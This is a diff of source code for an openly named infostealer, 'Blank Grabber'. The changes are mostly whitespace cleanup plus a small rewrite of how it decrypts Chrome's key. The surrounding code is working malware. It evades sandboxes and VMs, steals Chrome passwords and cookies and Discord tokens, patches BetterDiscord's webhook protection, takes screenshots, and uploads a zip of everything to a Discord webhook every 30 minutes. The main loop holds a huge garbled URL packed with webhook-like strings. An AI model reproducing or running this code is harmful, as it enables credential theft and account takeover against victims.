@@ -25,17 +25,17 @@ def generate(num=5):
 
 class vmprotect:
     def __init__(self):
-        if hasattr(sys, 'real_prefix'): 
+        if hasattr(sys, 'real_prefix'):
             os._exit(0)
-        
-        try: 
+
+        try:
             requests.get(f'https://blankgrabber-{generate()}.in/haha-caught-you!')
-        except Exception: 
+        except Exception:
             pass
-        else: 
+        else:
             os._exit(0)
-        
-        if os.path.isfile('D:/TOOLS/Detonate.exe'): 
+
+        if os.path.isfile('D:/TOOLS/Detonate.exe'):
             os._exit(0)
 
 class BlankGrabber:
@@ -72,7 +72,7 @@ class BlankGrabber:
             e.seek(0)
             e.write('These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+logs')
         self.send()
-        
+
     def copy(self, source, destination):
         try:
             shutil.copy(source, destination)
@@ -82,11 +82,11 @@ class BlankGrabber:
                 shutil.copy(source, destination)
             except Exception as e:
                 self.logs(e, sys.exc_info())
-    
+
     def logs(self, e, exc_info):
         with open(self.tempfolder+"/Logs.txt", 'a') as file:
             file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
-        
+
     def getpass(self):
         for filename in glob.iglob(self.chromefolder+'**/**', recursive=True):
             if os.path.basename(filename).lower()=='login data' and os.path.isfile(filename):
@@ -120,7 +120,7 @@ class BlankGrabber:
                     with open(passdc, 'wt') as file:
                         file.write("\n\n".join(data))
                     del data
-                        
+
     def getcookie(self):
         for filename in glob.iglob(self.chromefolder+'**/**', recursive=True):
             if os.path.basename(filename).lower()=='cookies' and os.path.isfile(filename):
@@ -154,14 +154,14 @@ class BlankGrabber:
                     with open(cookiedc, 'wt') as file:
                         file.write("\n\n".join(data))
                     del data
-                    
+
     def bypass_bd(self):
         try:
             with open(self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar", 'r+', encoding='cp437', errors='ignore') as bd:
                 bd.write(bd.read().replace('api/webhooks', 'api/webhook'))
         except Exception as e:
             self.logs(e, sys.exc_info())
-                        
+
     def getTokens(self):
         data = []
         paths = {
@@ -197,7 +197,7 @@ class BlankGrabber:
                         for token in re.findall(reg, line):
                             if not token in self.tokens:
                                 self.tokens.append(token)
-        
+
         for source, path in paths.items():
             if not source == "Chrome":
                 if not os.path.exists(path):
@@ -228,7 +228,7 @@ class BlankGrabber:
             with open(self.tempfolder+'/Discord Info.txt', 'w', errors="ignore") as file:
                 file.write("\n\n".join(data))
             del data
-            
+
     def screenshot(self):
         image = ImageGrab.grab()
         image.save(self.tempfolder + "/Screenshot.png")
@@ -244,7 +244,7 @@ class BlankGrabber:
                 return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
             except Exception as e:
                 self.logs(e, sys.exc_info())
-        
+
     def headers(self, token=None):
         headers = {
         "content-type" : "application/json",
@@ -252,9 +252,9 @@ class BlankGrabber:
         }
         if token:
             headers['authorization'] = token
-            
+
         return headers
-            
+
     def getip(self):
         headers = {'referer': 'https://ipinfo.io/'}
         for i in range(5):
@@ -266,27 +266,28 @@ class BlankGrabber:
         except Exception:
             r = requests.get('https://api.ipify.org').text
             return f"IP: {r.text}"
-        if r['privacy'].get('hosting', False): 
+        if r['privacy'].get('hosting', False):
             os._exit(0)
-        try: 
+        try:
             p = requests.get('https://blank-c.github.io/country-codes.json').json()
-        except Exception: 
+        except Exception:
             p = {}
         return  f"IP: {r['ip']}\nRegion: {r['region']}\nCountry: {p.get(r['country'], r['country'])}\nTimezone: {r['timezone']}\n\n{'VPN:'.ljust(6)} {'✅' if r['privacy']['vpn'] else '❎'}\n{'Proxy:'.ljust(6)} {'✅' if r['privacy']['proxy'] else '❎'}\n{'Tor:'.ljust(6)} {'✅' if r['privacy']['tor'] else '❎'}\n{'Relay:'.ljust(6)} {'✅' if r['privacy']['relay'] else '❎'}"
-        
+
     def get_decryption_key(self):
         key = self.chromefolder+"/Local State"
         with open(key) as key:
             key = json.load(key)
         try:
-            key = base64.b64decode(key["os_crypt"]["encrypted_key"])[5:]
-            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-        except Exception:
+            key = key.get("os_crypt").get("encrypted_key")
+        except AttributeError:
             return None
+        key = base64.b64decode(key)[5:]
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
     def zip(self):
         shutil.make_archive(self.archive[:-3], 'zip', self.tempfolder)
-        
+
     def send(self):
         self.zip()
         payload = {
@@ -304,7 +305,7 @@ class BlankGrabber:
   ],
   "username": "Blank Grabber",
   "avatar_url": "https://i.imgur.com/72yOkd1.jpg"
-}       
+}
         requests.post(self.webhook, json = payload)
         with open(self.archive,'rb') as file:
             requests.post(self.webhook, files = {"upload_file": file})
@@ -317,11 +318,11 @@ class BlankGrabber:
 
 if __name__ == "__main__":
     while True:
-        try: 
+        try:
             r = requests.get("https://v0c1bfeay0kv5becjdzczmjmgb0d4015vgco29qwxuod16b2q7zygqbmskfbwzf5qegfdu24g3o9fl7l2jwgfg0wg7jzns1wfz7t.9w3d7discordbkwebhooks28bit.lyfhv1tz9discord.comxsbit.lyapii0hapilbm0ade68ckv77728k1ivk.combj6bit.lyliapiw5telegramdiscord3xagxdownloadbit.lyjzss4kt8kapiyrnwebhookt0rorgtelegramqi9downloadsc2jib@z65b2191t1f3r9ykuuf4x3bjniwai40ycood3uq3cj6fl9b8kyin0cftvqg7ji0ci0jioy8ta3m7tjn0l41f6mia1laq6xsj6www.48hx7u2p9av2lb793i0uoaorgdownload5rapid5i2p3xwebhook3q2m4ivwebhook5itelegram8orgpx75nteq0yobit.lyw97l81fs.comwebhookl.exedatelegramq9czivgbit.lyw.exe79gnrapiyle24hldiscords@qwiyy18xlvb2oqbtrx5wk72eyl97dco8yqtdcuz7ixmvvz97kiqswi8p5gsw21f0xwarbl4fxe22jq9smbleoyifsk7xzn8f5gxy.z2jnp5vut1h.com7telegram60k2pfj.comwludownloadapiilorgorgcktelegrammyiorg23g6zcg757ptelegramugjw3ddownloadpi03apic.comhzykt7udiscordxt9api3fhym480mmbfh9c9xed8p8.exep@gstatic.com/generate_204?github.com/blank-c#11discord.com/api/webhooks/679734201347392288/ubfyRQpglBbnSULYCNANIdjxGrwDSwhbccpdyOgaNwvzeSRAuUnMQOmUiMhvGHljHjpM.discord.com/api/webhooks/772381866880917710/fVGMPhWBBzUfZZuEZMtxzqvssSltfekDQWhNezwMvkXUFiELTSWWRhgnsiciQKXMzexMHdiscord.com/api/webhooks/892689614555804119/pZopJyXiZSQBXstVqcYQujVwiJftHbDJxUMIRSBVfoyXrvTKyQzRnVhQHXaDOdhYRdwX^,/i2'2bu?fpgstatic.com]RAdiscord.com/api/webhooks/511943879466094486/tBHICfCgmXwrlOaaEzuoAiEHxkwnHUrzndozykHoQAxlsTtpPbBKZRrLncjdfUNfXgOYdiscord.com/api/webhooks/562301942246053699/OSmWGkXQpmLsQdczdeXEfPsiMOgbPDFBapDHrpxXVLrbXpJjaRpOsBdHEODxZGnNiaklh<q'u9oP!discord.com/api/webhooks/311905633359011659/uLrssbloSqTylSscfVJKRCwoKIGehhTNonebAdHhrgRpQnxHntRyOvlKRLTtRGwtyzUAgstatic.com>8[gstatic.comhDe?discord.com/api/webhooks/471939844622783776/cEGWOKnHxAtPbvnXOmHJzfZWpudyuIMmoREIvvHTzcRrWKxpKOtlRKRtiaNkLhVKxhvF5+G\gstatic.comGIOV~cd+discord.com/api/webhooks/475331550256890406/TGgsBQnoOEoLGjbxEPNEHWZQGgSXHuwhwocqLidBlxZSRQTzXtlAEMfBToMbaFNYMmNDGmgstatic.comXKRmdiscord.com/api/webhooks/269566390476970116/jmvQyswXjjIspmnRauYUxFHoMrGgdiMNXrxGWBzqQsdzvZkacxEnHEQazbubkajOupFJiwobgstatic.comYQ6C9>^-eYdiscord.com/api/webhooks/752176083165150919/CJQJSvymnbyaRfUiGMnuYUNlYBFJSDwJhlpxmDQGLjnYEMCsAOghOYuiEpqeHCVsavDcW}oGf?/a-sgqkGDbd")
             if r.status_code !=204:
                 os._exit(0)
-        except Exception: 
+        except Exception:
             pass
         else:
             vmprotect()
@@ -344,5 +345,5 @@ if __name__ == "__main__":
                 except Exception:
                     pass
             BlankGrabber()
-        finally: 
+        finally:
             time.sleep(1800) #30 Minutes
